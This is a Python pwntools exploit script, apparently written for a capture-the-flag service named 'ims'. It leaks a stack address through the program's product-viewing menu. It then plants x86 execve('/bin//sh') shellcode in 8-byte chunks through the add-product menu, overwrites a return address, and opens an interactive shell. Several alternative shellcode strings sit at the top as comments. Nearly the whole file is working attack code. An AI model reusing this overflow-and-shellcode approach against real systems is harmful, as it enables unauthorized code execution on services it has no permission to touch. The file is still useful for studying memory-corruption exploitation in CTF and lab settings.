from pwn import *
import re, sys
import struct
import time




#exploit = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
#exploit ="\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81"

#exploit = "\x31\xc0\x50\x68\x2f\x2f\x73\x68 \x68\x2f\x62\x69 \x6e\x89\xe3\x50\x53\x89\xe1\xb0\ x0b\xcd\x80"
#exploit = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80 \x53\x68/tt y\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
exploit = "\x31\xc0\x50\x68\x2f\x2f\x73\x68 \x68\x2f\x62\x69 \x6e\x89\xe3\x89\xc1\x89\xc2\xb0 \x0b\xcd\x80\x31 \xc0\x40\xcd\x80"

offset = 0xe0

#conn = remote('127.0.0.1' ,1338)
conn = remote('ims.ctf.rc3.club' ,7777)

raw_input()

line = conn.recvuntil('Choose:')
print line
conn.send('3\n')

line = conn.recvuntil('Enter the index of the product you wish to view:')
print line
conn.send('7\n')

line = conn.recvuntil(',')
elem = line.split(' ')[3].split(',')
#print int(elem[0])

return_addr = int(elem[0])+0xffffffff+1-offset

print hex(return_addr)

null_word = "\x90\x90\x90\x90\x90\x90\x90\x90"
null_index = 0x90909090


exploit_1 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
exproit_1_num = 0x69622f68
exproit_2 = "\x6e\x89\xe3\x89\xc1\x89\xc2\xb0"
exproit_2_num = 0x3180cd0b
exproit_3 = "\xc0\x40\xcd\x80\x90\x90\x90\x90"
last_word = struct.pack('<I',return_addr)
last_word += struct.pack('<I',return_addr)

word = [null_word, exploit_1, exproit_2, exproit_3, null_word, null_word, last_word]
index = [null_index, exproit_1_num, exproit_2_num, null_index, null_index, null_index, return_addr]


for i in xrange(7):

    line = conn.recvuntil('Choose:')
    print line
    conn.send('1\n')

    line = conn.recvuntil('Enter product ID:')
    print line
    conn.send(str(index[i])+'\n')

    line = conn.recvuntil('Enter product code:')
    print line
    conn.send(word[i]+'\n')

line = conn.recvuntil('Choose:')
conn.send('4\n')

conn.interactive()
